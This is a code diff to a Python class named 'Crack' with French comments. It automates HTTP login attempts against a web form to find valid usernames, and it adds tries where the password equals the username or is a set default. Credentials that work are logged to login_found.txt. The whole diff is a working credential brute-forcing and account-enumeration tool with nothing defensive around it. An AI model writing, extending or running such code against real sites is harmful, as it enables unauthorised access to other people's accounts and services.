@@ -11,6 +11,7 @@ class Crack:
         self.Lettre_optimiz='QWERTYUIOPASDFGHJKLZXCVBNM'
         self.special_optimiz='~!@#$%^&*()_+{`}"|?><:;\'[]=-\\'
         self.space_optimiz=' '
+        self.out_file_name = "login_found.txt"
         self.num_login_found=0
         self.lettre_len=25
         self.Lettre_len=25
@@ -71,8 +72,12 @@ class Crack:
 
             # envoye ; reception ; et traitement automatique des requetes HTTP
             while self.bou==1:
+                if env.username_is_password==True:
+                    self.password=self.user
+                else :
+                    self.password = env.default_password
                 try:
-                    self.req=env.url+'?'+env.login+'='+str(self.user)+'&'+env.psw+'=1'
+                    self.req=env.url+'?'+env.login+'='+str(self.user)+'&'+env.psw+'='+str(self.password)
                     self.r=rq.urlopen(self.req)
                     self.bou = 0
                 except:
@@ -82,10 +87,10 @@ class Crack:
             self.t4=int(((self.t2-self.t1)*(36**3))//60)
             self.t3=int((1/(self.t2-self.t1))*18)
             # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
-            if env.invalid_password_error_msg in str(self.r.read()):
+            if env.invalid_password_error_msg in str(self.r.read()) or env.success_message in str(self.r.read()):
                 self.num_login_found+=1
                 print(self.user+"\n")
-                with open("login_found.txt",'a') as f:
+                with open(self.out_file_name,'a') as f:
                     f.write(self.user+"\n")
             else :
                 print("login {} incorrect ||  {}  login/sec || {} min restant ".format(self.user,self.t3,self.t4),end="\r")
